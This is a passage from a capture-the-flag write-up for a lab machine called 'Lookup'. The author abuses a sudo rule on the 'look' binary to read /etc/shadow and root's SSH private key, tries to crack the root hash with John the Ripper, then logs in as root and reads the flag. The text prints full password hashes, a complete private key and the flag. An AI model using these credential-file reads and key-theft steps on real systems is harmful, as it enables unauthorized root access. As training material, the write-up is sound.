                        "<p><pre><b>think@lookup</b>:~$ LFILE=/etc/shadow<br><b>think@lookup</b>:~$ sudo look '' \"$LFILE\"<br>root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::<br>daemon:*:19046:0:99999:7:::<br>bin:*:19046:0:99999:7:::<br>sys:*:19046:0:99999:7:::<br>sync:*:19046:0:99999:7:::<br>games:*:19046:0:99999:7:::<br>man:*:19046:0:99999:7:::<br>lp:*:19046:0:99999:7:::<br>mail:*:19046:0:99999:7:::<br>news:*:19046:0:99999:7:::<br>uucp:*:19046:0:99999:7:::<br>proxy:*:19046:0:99999:7:::<br>www-data:*:19046:0:99999:7:::<br>backup:*:19046:0:99999:7:::<br>list:*:19046:0:99999:7:::<br>irc:*:19046:0:99999:7:::<br>gnats:*:19046:0:99999:7:::<br>nobody:*:19046:0:99999:7:::<br>systemd-network:*:19046:0:99999:7:::<br>systemd-resolve:*:19046:0:99999:7:::<br>systemd-timesync:*:19046:0:99999:7:::<br>messagebus:*:19046:0:99999:7:::<br>syslog:*:19046:0:99999:7:::<br>_apt:*:19046:0:99999:7:::<br>tss:*:19046:0:99999:7:::<br>uuidd:*:19046:0:99999:7:::<br>tcpdump:*:19046:0:99999:7:::<br>landscape:*:19046:0:99999:7:::<br>pollinate:*:19046:0:99999:7:::<br>usbmux:*:19510:0:99999:7:::<br>sshd:*:19510:0:99999:7:::<br>systemd-coredump:!!:19510::::::<br>lxd:!:19510::::::<br>think:$6$Cqt14LKfnwO1hA/a$c/g4M9yiP1KGJtbiOS4zubpw2.sm4bPfCglqddPpUS615xwwsU4eg1q.nr6UDLppea8AlmJ5fQUUewLICNU371:19568:0:99999:7:::<br>fwupd-refresh:*:19510:0:99999:7:::<br>mysql:!:19568:0:99999:7:::<br></pre></p>",
                        "First step is to save the hash in a file that I named \"hash\", <br><code>echo \"root:$6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRwG9rgKqurGHHLpMWIXd01lUsj42ifJHHkBlwodtvi1C2Vor8Hwbu6sU1:19855:0:99999:7:::\" > hash</code>.",
                        "<p><pre>$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 2 OpenMP threads<br>Press 'q' or Ctrl-C to abort, almost any other key for status<br></pre></p>",
                        "<p>I left running JohnTheRipper (JTR) for a very long time, it was not finished yet and it did not find the password. Usually, it's an indication that this is not the right way. Why can I say this? The box submission guidelines specify that every password that is meant to be cracked must finish around 5 minutes of the tool running. This is a uideline that HTB and THM follows.</p>",
                        "<p>Now after spending a little time, I figured out that I can try to read the SSH id_rsa file to log as <i>root</i> without the need for a password. Let's try this! The path where the <i>id_rsa</i> is usually stored is <i>[userhome]/.ssh/id_rsa</i> in this case the home is <i>/root</i> so the full path would be <i>/root/.ssh/id_rsa</i> if it exists.</p>",
                        "<p><pre><b>think@lookup</b>:~$ LFILE=/root/.ssh/id_rsa<br><b>think@lookup</b>:~$ sudo look '' \"$LFILE\"<br>[sudo] password for think: <br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR<br>Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR<br>j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD<br>bV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmd<br>ISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC<br>4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRM<br>hufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhd<br>k5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2<br>EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyr<br>UUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCez<br>xjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1<br>e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb<br>0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGX<br>w/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHt<br>x7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6<br>YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7Vx<br>zdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl<br>+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf<br>05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GX<br>Nn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUz<br>YZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR1<br>1fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPi<br>t1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAA<br>AMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hz<br>w/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxn<br>vD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCj<br>rirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/<br>C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06<br>K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd10<br>5qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5T<br>DJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQis<br>sJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVF<br>dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL<br>3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0<br>DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==<br>-----END OPENSSH PRIVATE KEY-----<br></pre></p>",
                        "<p><img src=\"/cyber/writeup/lookup/jackpot.jpg\" alt=\"\"></p>",
                        "<p>The last this to do is to copy the key and paste on my local kali in a file name id_rsa to attempt to log in with SSH as root, <code>ssh -i ./id_rsa root@10.10.159.232</code></p>",
                        "<p><pre>$ ssh -i ./id_rsa root@10.10.159.232<br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Thu 30 Jan 2025 04:59:02 PM UTC<br><br>  System load:  0.0               Processes:             132<br>  Usage of /:   59.7% of 9.75GB   Users logged in:       1<br>  Memory usage: 11%               IPv4 address for ens5: 10.10.159.232<br>  Swap usage:   0%<br><br><br>Expanded Security Maintenance for Applications is not enabled.<br><br>7 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>Enable ESM Apps to receive additional future security updates.<br>See https://ubuntu.com/esm or run: sudo pro status<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Mon May 13 10:00:24 2024 from 192.168.14.1<br><b style='color:red'>root@lookup</b>:~# whoami<br>root<br><b style='color:red'>root@lookup</b>:~# cat root.txt<br>5a285a9f257e45c68bb6c9f9f57d18e8<br></pre></p>"
                    ]
                }
            ]
        }
    ]
}
